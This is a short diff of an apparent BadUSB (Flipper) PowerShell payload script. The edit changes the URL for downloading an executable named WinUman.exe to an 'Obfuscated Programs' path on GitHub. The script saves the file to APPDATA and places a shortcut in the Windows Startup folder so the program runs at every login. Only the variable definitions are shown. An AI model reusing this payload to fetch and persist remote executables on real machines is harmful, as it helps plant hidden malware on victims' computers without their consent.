@@ -1,5 +1,5 @@
 # Variables
-$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinUman.exe"
+$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/Obfuscated Programs/WinUman.exe"
 $exePath = "$env:APPDATA\WinUman.exe"
 $shortcutName = "WinUman.lnk"
 $shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$shortcutName"
